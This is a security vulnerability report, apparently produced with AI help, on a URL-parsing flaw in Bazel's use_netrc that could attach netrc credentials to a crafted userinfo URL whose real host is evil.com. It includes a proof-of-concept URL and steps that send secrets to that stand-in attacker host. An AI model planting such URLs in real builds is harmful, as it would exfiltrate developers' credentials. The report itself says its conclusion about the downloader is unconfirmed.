### Title
Netrc host parsing in `use_netrc` ignores URL userinfo, allowing credential exfiltration to an attacker-controlled host - ([File: tools/build_defs/repo/utils.bzl])

### Summary
Bazel's `use_netrc` helper computes the "host" of a download URL with a hand-rolled, RFC 3986-unaware string split, rather than a standards-compliant URL/URI parser. This lets an attacker who controls a single URL value (e.g. a dependency URL an unprivileged contributor puts in a `http_archive`/`http_file`/`http_jar` call, or a URL embedded in generated build files fetched from an untrusted branch) construct a URL whose *userinfo* component collides with a legitimate netrc machine name, while the *actual* host that the real network stack connects to is attacker-controlled. Because Bazel's credential-lookup keys off the naively-parsed string instead of the true authority host, credentials meant for the trusted host get attached to a request destined for the attacker's server.

### Finding Description
`use_netrc` in `tools/build_defs/repo/utils.bzl` extracts the host from a URL like this: [1](#0-0) 

```
schemerest = url.split("://", 1)
...
host = schemerest[1].split("/")[0].split(":")[0]
if host in netrc:
    authforhost = netrc[host]
```

This takes everything up to the first `/` as the "authority" and then everything up to the first `:` as the "host." It never accounts for URL userinfo (`user:pass@host`) syntax, which per RFC 3986 places the *real* host **after** the `@` sign, not before the first `:`.

Consider a URL of the form:

`https://bar.example.org:1234@evil.com/malicious.tar`

- Per RFC 3986 / any standards-compliant URL parser (which the real download/HTTP stack that Bazel's Java downloader ultimately uses to open the connection relies on), the authority is `bar.example.org:1234@evil.com`: userinfo = `bar.example.org:1234`, host = `evil.com`. The TCP connection and any credential/Authorization header transmission goes to `evil.com`.
- Per Bazel's naive parser, `schemerest[1]` = `"bar.example.org:1234@evil.com/malicious.tar"`. `split("/")[0]` = `"bar.example.org:1234@evil.com"`, then `.split(":")[0]` = `"bar.example.org"`. This **matches** a legitimate netrc entry for `bar.example.org`.

The consequence: `use_netrc` attaches the login/password (or `auth_patterns`-derived `Authorization` header) for `bar.example.org` to a URL whose real destination is `evil.com`, an attacker-controlled origin. This is exactly the CWE-435 class in the report — a discrepancy between two components' interpretation of the same URL string used for a security decision (which host gets which credentials) — but here it manifests as credential leakage instead of a logging bypass.

The existing regression test in `starlark_repository_test.sh` only probes the simpler "host confusion via path" case (`https://evil.com/bar.example.org/file4.tar`), which the `split("/")[0]` logic correctly defeats since it stops at the first `/`. It does not test the userinfo-based authority confusion (`user@host` or `host:port@host`) case: [2](#0-1) 

The `get_auth`/`use_netrc` pipeline is the sole gate deciding which URLs receive netrc-derived Basic/Bearer credentials for `http_archive`, `http_file`, `http_jar`, and any custom repository rule using these utilities: [3](#0-2) 

### Impact Explanation
An unprivileged attacker who can supply or influence a single dependency URL string (e.g., contributing a `http_archive` entry, or a URL value processed by a repository rule on an untrusted branch that a victim's CI later builds against with a configured `.netrc`) can cause Bazel to send the victim's stored credentials (login/password/bearer token for a real internal host such as an internal Artifactory/Nexus/cloud storage endpoint) to a server the attacker controls, resulting in credential exfiltration to an attacker-controlled host. This does not require a MITM, malicious peer, or access to the victim's machine — only that the URL string reaches `use_netrc`/`get_auth`.

### Likelihood Explanation
Exploitability requires: (1) the victim to have `.netrc`/`NETRC`/`netrc` attr entries for a real host, and (2) an attacker-influenced URL string flowing into `get_auth`/`use_netrc` (e.g., via a `http_archive` URL in a PR, or a generated `WORKSPACE`/module file consumed by CI on an untrusted branch). This is a realistic but not universal scenario — it depends on organizational use of `.netrc`-based auth for private mirrors, which the `auth_patterns`/`netrc` machinery is explicitly designed to support. Given the targeted nature of the trigger (crafting the userinfo confusion), likelihood is Medium, matching the CVSS "Medium" nature of the original analog.

### Recommendation
Replace the manual string splitting in `use_netrc` with authority parsing that mirrors RFC 3986 semantics: explicitly split on the last `@` in the authority component to separate userinfo from host, and only then split on `:` to strip the port, e.g. `authority.rsplit("@", 1)[-1].split(":")[0]`. Additionally, reject or ignore URLs whose authority contains a userinfo component that itself looks like a hostname when determining credential attachment, and add regression tests analogous to `starlark_repository_test.sh`'s existing `evil.com/bar.example.org` case, but for `bar.example.org@evil.com` and `bar.example.org:1234@evil.com` forms.

### Proof of Concept
A `src/test/shell/bazel/starlark_repository_test.sh`-style JUnit/shell reproduction:

1. Create a `.netrc` with:
```
machine bar.example.org
login barusername
password secrettoken
```
2. Invoke `use_netrc(read_netrc(ctx, ".netrc"), ["https://bar.example.org:1234@evil.com/payload.tar"], {})`.
3. Observe that the returned `auth` dict contains an entry for the URL `https://bar.example.org:1234@evil.com/payload.tar` with `login = "barusername"`, `password = "secrettoken"` — i.e., credentials scoped to `bar.example.org` are attached to a URL whose real destination host (per standard URL parsing used by the downloader) is `evil.com`.
4. Passing this `auth` dict to `ctx.download(url, auth = auth)` results in the `Authorization`/Basic-auth header for `bar.example.org` being sent in an HTTP request whose connection target is `evil.com`, demonstrating credential exfiltration to an attacker-controlled host.

Note: I could not directly locate the Java-side HTTP client code (`HttpDownloader`/`NetrcCredentials`) in the indexed content to confirm byte-for-byte that it uses standard URI/URL parsing for making the actual connection versus reusing Bazel's Starlark-computed host string; this assessment relies on the standard behavior of URL authority parsing (RFC 3986) as the basis for the real network connection, contrasted with the naive Starlark-level parser in `use_netrc`. A Devin session with full repository access could confirm this by inspecting the downloader's connection-establishment code path.

```text
def get_auth(ctx, urls):
    """Utility function to obtain the correct auth dict for a list of urls from .netrc file.

    Support optional netrc and auth_patterns attributes if available.

    Args:
      ctx: The repository context of the repository rule calling this utility
        function.
      urls: the list of urls to read

    Returns:
      the auth dict which can be passed to repository_ctx.download
    """
    if hasattr(ctx.attr, "netrc") and ctx.attr.netrc:
        netrc = read_netrc(ctx, ctx.attr.netrc)
    elif "NETRC" in ctx.os.environ:
        netrc = read_netrc(ctx, ctx.os.environ["NETRC"])
    else:
        netrc = read_user_netrc(ctx)
    auth_patterns = {}
    if hasattr(ctx.attr, "auth_patterns") and ctx.attr.auth_patterns:
        auth_patterns = ctx.attr.auth_patterns
    return use_netrc(netrc, urls, auth_patterns)
```
